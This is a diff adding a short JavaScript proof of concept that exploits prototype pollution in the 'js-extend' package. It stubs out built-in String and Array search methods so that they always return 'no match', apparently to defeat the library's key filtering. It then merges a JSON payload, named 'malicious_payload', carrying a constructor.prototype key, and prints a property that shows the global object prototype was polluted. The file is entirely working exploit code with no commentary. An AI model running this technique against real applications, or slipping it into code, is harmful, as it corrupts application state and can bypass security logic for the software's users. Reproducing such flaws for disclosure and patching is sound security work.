@@ -1,0 +1,15 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+console.log({}.polluted);
+const jsExtend = require('js-extend');
+const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
+jsExtend.extend({}, JSON.parse(malicious_payload));
+console.log({}.polluted);
